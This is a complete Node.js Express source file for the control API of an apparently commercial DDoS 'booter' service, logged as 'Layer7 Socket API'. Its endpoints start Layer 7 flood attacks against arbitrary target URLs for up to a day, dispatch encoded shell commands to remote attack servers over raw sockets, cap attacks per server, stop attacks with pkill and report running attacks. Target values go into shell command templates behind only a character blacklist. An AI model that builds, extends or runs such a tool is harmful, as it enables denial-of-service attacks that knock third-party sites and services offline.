const express = require('express');
const app = express();
const net = require('net');
const mysql = require('mysql');

const urlRegex = /^(https?:\/\/)[^\s/$.?#].[^\s]*$/;
const blackList = ['\'', '"', '[', ']', '{', '}', '(', ')', ';', '|', '&', '%', '#', '@'];

const servers = require('./servers.json');
const commands = require('./commands.json');
const settings = require('./settings.json');

const pool = mysql.createPool({
    connectionLimit: 10,
    host: settings.database.host,
    user: settings.database.user,
    password: settings.database.password,
    database: settings.database.database
});
  
const socket_token = settings.socket_token;
const maxAttacks = settings.max_attacks;
const api_port = settings.api_port;

function queryDatabase(query, params) {
    return new Promise((resolve, reject) => {
        pool.getConnection((err, connection) => {
            if (err) {
                reject(err);
                return;
            }
    
            connection.query(query, params, (error, results) => {
                connection.release();
                if (error) {
                    reject(error);
                } else {
                    resolve(results);
                }
            });
        });
    });
}

app.get('/api/attack', async (req, res) => {

    const attack_id = Math.floor((Math.random() * 125000));

    const field = {
        target: req.query.target || undefined,
        duration: req.query.duration || undefined,
        method: req.query.method || undefined,
        server: req.query.server || undefined,
    };

    if (!field.target || !urlRegex.test(field.target)) return res.json({ status: 500, data: `target needs to be a valid URL` });
    if (!field.duration || isNaN(field.duration) || field.duration > 86400) return res.json({ status: 500, data: `time needs to be a number between 0-86400` });
    if (!field.server || !servers.hasOwnProperty(field.server)) return res.json({ status: 500, data: `server is invalid or not found in the servers list` });
    if (!field.method || !Object.keys(commands).includes(field.method.toUpperCase())) return res.json({ status: 500, data: `invalid attack method` });

    const containsBlacklisted = blackList.some(char => field.target.includes(char));
    if (containsBlacklisted) return res.json({ status: 500, data: `target include blacklisted chars` });

    try {

        var [{ 'COUNT(*)': running }] = await queryDatabase('SELECT COUNT(*) FROM `attacks` WHERE `duration` + `date_sent` > UNIX_TIMESTAMP() AND `stopped` = 0 AND `server` = ?', [field.server]);

        if (running >= maxAttacks) {
            return res.json({
                status: 500,
                message: `this server is full (${running} running attacks)`,
            });
        }

        const command = commands[field.method.toUpperCase()]
        .replace('${attack_id}', attack_id)
        .replace('${target}', field.target)
        .replace('${duration}', field.duration);
    
        const data = {
            socket_token: socket_token,
            command: command
        };

        const encodedData = Buffer.from(JSON.stringify(data)).toString('base64');

        const startTime = process.hrtime();

        const response = await sendData(field.server, encodedData);

        if (!response.includes("success")) {
            await queryDatabase('UPDATE `attacks` SET `stopped` = 1 WHERE `attack_id` = ?', [attack_id]);

            return res.json({
                status: 500,
                message: 'failed to start attack',
            });
        }

        const elapsedTime = process.hrtime(startTime);
        const elapsedTimeMs = elapsedTime[0] * 1000 + elapsedTime[1] / 1000000;

        await queryDatabase("INSERT INTO `attacks` VALUES(NULL, ?, ?, ?, ?, UNIX_TIMESTAMP(), 0, ?)", [field.server, field.target, field.duration, field.method, attack_id]);

        return res.json({
            status: 200,
            message: 'attack started successfully',
            id: attack_id,
            elapsed_time: elapsedTimeMs.toFixed(2) + "ms",
            data: {
                target: field.target,
                duration: field.duration,
                method: field.method
            }
        });

    } catch (e) {

        await queryDatabase('UPDATE `attacks` SET `stopped` = 1 WHERE `attack_id` = ?', [attack_id]);

        return res.json({
            status: 200,
            message: 'failed to start attack',
        });
    }

});

app.get(`/api/stop`, async (req, res) => {

    const field = {
        attack_id: req.query.attack_id || undefined
    };

    if (!field.attack_id || isNaN(field.attack_id)) return res.json({ status: 500, data: `invalid attack id` });

    try {

        var server = await queryDatabase('SELECT `server` FROM `attacks` WHERE `attack_id` = ?', [field.attack_id]);

        const data = { socket_token: socket_token, command: `screen -dm pkill -f ${field.attack_id}` };

        const encodedData = Buffer.from(JSON.stringify(data)).toString('base64');

        const startTime = process.hrtime();

        const response = await sendData(server[0].server, encodedData);

        if (!response.includes("success")) {
            return res.json({
                status: 500,
                message: 'failed to stop attack',
            });
        }

        const elapsedTime = process.hrtime(startTime);
        const elapsedTimeMs = elapsedTime[0] * 1000 + elapsedTime[1] / 1000000;

        await queryDatabase('UPDATE `attacks` SET `stopped` = 1 WHERE `attack_id` = ?', [field.attack_id]);

        return res.json({
            status: 200,
            message: 'attack stopped successfully',
            id: field.attack_id,
            elapsed_time: elapsedTimeMs.toFixed(2) + "ms"
        });

    } catch (e) {

        return res.json({
            status: 200,
            message: 'failed to stop attack',
        });
    }

});

app.get(`/api/stop_all`, async (req, res) => {

    try {

        var activeServers = await queryDatabase('SELECT DISTINCT `server` FROM `attacks` WHERE `duration` + `date_sent` > UNIX_TIMESTAMP() AND `stopped` = 0');

        const startTime = process.hrtime();
    
        for (var i = 0; i < activeServers.length; i++) {

            var server = activeServers[i].server;
        
            const data = { socket_token: socket_token, command: `screen -dm pkill -f attack_` };
    
            const encodedData = Buffer.from(JSON.stringify(data)).toString('base64');
    
            const response = await sendData(server, encodedData);
    
            if (!response.includes("success")) {
                return res.json({
                    status: 500,
                    message: 'failed to stop attacks',
                });
            };

            await queryDatabase('UPDATE `attacks` SET `stopped` = 1 WHERE `server` = ?', [server]);

        }

        const elapsedTime = process.hrtime(startTime);
        const elapsedTimeMs = elapsedTime[0] * 1000 + elapsedTime[1] / 1000000;
    

        return res.json({
            status: 200,
            message: 'attacks stopped successfully',
            elapsed_time: elapsedTimeMs.toFixed(2) + "ms"
        });

    } catch (e) {
        return res.json({
            status: 200,
            message: 'failed to stop attack',
        });
    }

});

app.get('/api/status', async (req, res) => {

    try {

        var activeServers = await queryDatabase('SELECT DISTINCT `server` FROM `attacks` WHERE `duration` + `date_sent` > UNIX_TIMESTAMP() AND `stopped` = 0');
    
        var responseObject = {
            status: 200,
            message: 'server information',
            serverAttacks: {}
        };
    
        for (var i = 0; i < activeServers.length; i++) {

            var server = activeServers[i].server;
        
            var attacks = await queryDatabase('SELECT target, method, attack_id FROM `attacks` WHERE `duration` + `date_sent` > UNIX_TIMESTAMP() AND `stopped` = 0 AND `server` = ?', [server]);
        
            var [{ 'COUNT(*)': running }] = await queryDatabase('SELECT COUNT(*) FROM `attacks` WHERE `duration` + `date_sent` > UNIX_TIMESTAMP() AND `stopped` = 0 AND `server` = ?', [server]);
        
            responseObject.serverAttacks[server] = {
                attacks: attacks,
                totalSlots: maxAttacks,
                usedSlots: running
            };

        }
    
        return res.json(responseObject);

    } catch (e) {

        return res.json({
            status: 200,
            message: 'failed to get information',
        });
    }

});

app.listen(api_port, () => console.log(`Layer7 Socket API started on port ${api_port}`));

function sendData(serverName, data) {
    return new Promise((resolve, reject) => {
        const server = servers[serverName];
        if (server) {
            const socket = new net.Socket();

            socket.connect(server.port, server.ip, () => {
                socket.write(data);
            });

            socket.on('data', (result) => {
                const response = result.toString();
                socket.destroy();
                resolve(response);
            });

            socket.on('error', (err) => {
                socket.destroy();
                reject('error');
            });
        } else {
            reject('error');
        }
    });
}